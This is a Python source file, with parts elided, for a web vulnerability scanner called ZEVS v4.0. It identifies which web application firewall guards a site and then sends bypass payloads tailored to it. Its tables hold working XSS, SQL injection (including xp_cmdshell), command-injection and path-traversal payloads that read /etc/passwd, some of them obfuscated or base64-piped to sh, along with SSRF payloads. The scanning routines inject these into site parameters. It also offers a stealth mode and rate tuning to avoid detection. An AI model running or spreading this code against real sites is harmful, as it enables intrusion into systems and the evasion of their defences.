#!/usr/bin/env python3
"""
ZEVS v4.0 - Professional Web Vulnerability Scanner
Production-ready async scanner with WAF-aware bypass payloads
...
# BUG FIX 1: Suppress SSL warnings
try:
    import urllib3
...
try:
    ...
    print("    pip install httpx rich urllib3")
    sys.exit(1)
...
# ============================================================================
# 2. WAFDetector - Enhanced WAF Detection
# ============================================================================
...
class WAFDetector:
    ...
    SIGNATURES = {
        ...
        "Akamai": {
            "headers": ["x-akamai-transformed", "akamaighost", "ak_bmsc"],
            "body": [],
        },
        "AWS WAF": {"headers": ["x-amzn-requestid", "x-amzalb-cookie"], "body": []},
        "ModSecurity": {"headers": [], "body": ["mod_security", "406 not acceptable"]},
        "Imperva": {
            "headers": ["incap_ses", "visid_incap"],
            "body": ["powered by incapsula"],
        },
        "F5 BIG-IP": {"headers": ["bigipserver", "ts cookies"], "body": []},
        "Sucuri": {"headers": ["x-sucuri-id", "sucuri/cloudproxy"], "body": []},
        "Azure WAF": {"headers": ["x-azure-ref", "arrafinity"], "body": []},
        "Wordfence": {"headers": ["wfvl"], "body": ["generated by wordfence"]},
        "Fortiweb": {"headers": ["fortiwafsid", "server: fortiWeb"], "body": []},
        "Barracuda": {
            "headers": ["bni_barracuda_lb_cookie", "barr_counter_session"],
            "body": [],
        },
    }

    @staticmethod
    def detect(headers: Dict[str, str], body: str = "") -> Optional[str]:
        ...
        for waf, sigs in WAFDetector.SIGNATURES.items():
            for sig in sigs["headers"]:
                if any(sig in k or sig in v for k, v in h.items()):
                    return waf
...
# ============================================================================
# 3. WAFPayloads - WAF-Specific Bypass Payloads
# ============================================================================


class WAFPayloads:
    """WAF-specific bypass payloads from security research"""

    XSS = {
        "Cloudflare": ["<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>"],
        "Sucuri": [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x:alert(1) onerror=eval(src)>",
        ],
        "Wordfence": ["<script>alert`1`</script>", "<svg><script>alert(1)</script>"],
        "Generic": [
    ...
    SQLI = {
        "Cloudflare": [
            "/*%21%53%45%4c%45%43%54*/",
            "/*!50000UNION*/+/*!50000SELECT*/+1,2,3--",
        ],
        "Akamai": ["-1' UNION%23%0ASELECT 1,2,3--", "' UNION ALL%23%0ASELECT 1,2,3--"],
        "AWS WAF": ["-1' OR 1.e(1)", "-1' OR 1=1.0--"],
        "ModSecurity": ["' UNION%0ASELECT%0A1,2,3--", "/**/UNION/**/SELECT/**/1,2,3--"],
        "Imperva": ["' UNION(SELECT(1),(2),(3))--"],
        "F5 BIG-IP": ["'; EXEC xp_cmdshell('whoami')--"],
        "Sucuri": ["1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
        "Azure WAF": ["1' AND 1IF(1=1,1,0)--", "' AND 1=1 LIMIT 1--"],
        "Wordfence": ["' OR 1 BETWEEN 1 AND 1--"],
        "Fortiweb": ["' AND ascii(substring(database(),1,1))>64--"],
        "Barracuda": ["' GROUP BY 1 HAVING 1=1--"],
        "Generic": ["'", '"', "' OR '1'='1", "1' AND '1'='1", "' OR 1=1--"],
    }

    RCE = {
        "Cloudflare": [";cat${IFS}/etc/passwd", ";cat${IFS}${IFS}/etc/passwd"],
        "Akamai": [";${cat,/etc/passwd}"],
        "AWS WAF": [";cat$IFS/etc$IFS/passwd"],
        "ModSecurity": ["/???/??t /???/passwd", "/???/???/p?s??"],
        "Imperva": ["c\\at /etc/passwd"],
        "F5 BIG-IP": ["echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh"],
        "Sucuri": ["$(cat$u0009/etc/passwd)--"],
        "Azure WAF": ["; $(id)"],
        "Barracuda": ["$(id)"],
        "Generic": [";id", "|id", "`id`", "$(id)"],
    }
    ...
    PATH_TRAVERSAL = {
        "Cloudflare": ["..%2F..%2F..%2Fetc%2Fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
        "Akamai": ["..%252F..%252Fetc%252Fpasswd"],
        "AWS WAF": ["..%c0%afetc%c0%afpasswd"],
        "ModSecurity": ["..;/../etc/passwd", "..%00/../etc/passwd"],
        "Imperva": ["..%5c..%5cetc%5cpasswd"],
        "F5 BIG-IP": ["..%5c..%5c..%5cEtc/passwd"],
        "Sucuri": ["/....//....//....//etc/passwd"],
        "Wordfence": ["....//....//etc/passwd"],
        "Generic": ["../../../etc/passwd", r"..\..\..\windows\win.ini"],
    }
    ...
    SSRF = {
        ...
        "Barracuda": ["http://8x7f000001/", "http://2130706433/"],
        "Generic": [
    ...
    @staticmethod
    def get(vuln_type: str, waf: Optional[str]) -> List[str]:
        """Get bypass payloads for vuln type and detected WAF"""
        mapping = {
            "xss": WAFPayloads.XSS,
            "sqli": WAFPayloads.SQLI,
            "rce": WAFPayloads.RCE,
            "lfi": WAFPayloads.PATH_TRAVERSAL,
            "ssrf": WAFPayloads.SSRF,
        }
        table = mapping.get(vuln_type.lower(), {})
        specific = table.get(waf, []) if waf else []
        generic = table.get("Generic", [])
...
class VulnModules:
    ...
    async def test_sqli(self, url: str, params: List[str]) -> List[Dict]:
        """Test SQL injection - error-based and time-based with WAF bypass"""
        findings = []

        error_payloads = WAFPayloads.get("sqli", self.waf)
    ...
    async def test_xss(self, url: str, params: List[str]) -> List[Dict]:
        """Test reflected XSS with WAF bypass"""
        findings = []
        payloads = WAFPayloads.get("xss", self.waf)
    ...
    async def test_ssrf(self, url: str, params: List[str]) -> List[Dict]:
        """Test SSRF with cloud metadata and WAF bypass"""
        findings = []
        payloads = WAFPayloads.get("ssrf", self.waf)
...
<root>&xxe;</root>"""
    ...
    async def test_lfi(self, url: str, params: List[str]) -> List[Dict]:
        """Test LFI with path traversal and WAF bypass"""
        findings = []
        payloads = WAFPayloads.get("lfi", self.waf)
    ...
    async def test_rce(self, url: str, params: List[str]) -> List[Dict]:
        """Test RCE with WAF bypass payloads"""
        findings = []
        payloads = WAFPayloads.get("rce", self.waf)
        rce_indicators = ["uid=", "gid=", "root:", "www-data", "daemon"]

        for param in params:
            for payload in payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}=127.0.0.1{payload}"

                resp = await self._make_request(test_url)
                if resp and any(ind in resp.text for ind in rce_indicators):
                    findings.append(
                        {
                            "type": "RCE",
                            "url": test_url,
...
class HTMLReportGenerator:
    ...
    def generate(target: str, findings: List[Dict], stats: Dict) -> str:
        ...
        for i, finding in enumerate(findings, 1):
            ...
            waf_info = ""
            if finding.get("waf_bypassed"):
                waf_info = f"<p><strong>WAF Bypassed:</strong> <span style='color:#f59e0b'>{finding['waf_bypassed']}</span></p>"
...
<body>
    <div class="header">
        <h1>ZEVS v4.0 Security Report</h1>
        <p>Target: {target}</p>
        <p>Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>WAF Detected: <span style="color:#f59e0b">{stats.get("waf_detected", "None")}</span></p>
    </div>
    ...
    <div style="text-align:center; margin-top:50px; opacity:0.6">
        <p>Generated by ZEVS v4.0 - Professional Vulnerability Scanner with WAF Bypass</p>
    </div>
</body>
</html>"""
        ...
        async with httpx.AsyncClient(
            ...
            try:
                waf_resp = await client.get(
                    self.target, follow_redirects=True, timeout=10.0
                )
                detected_waf = WAFDetector.detect(dict(waf_resp.headers), waf_resp.text)
                ...
                if detected_waf:
                    ...
                    if detected_waf in waf_rates:
                        rps, jitter = waf_rates[detected_waf]
...
if __name__ == "__main__":
    ...
    parser = argparse.ArgumentParser(
        description="ZEVS v4.0 - Professional Web Vulnerability Scanner with WAF Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python zevs_v4.py https://example.com
  python zevs_v4.py https://example.com --threads 20 --rate 10
  python zevs_v4.py https://example.com --stealth --output ./reports
        """,
    )
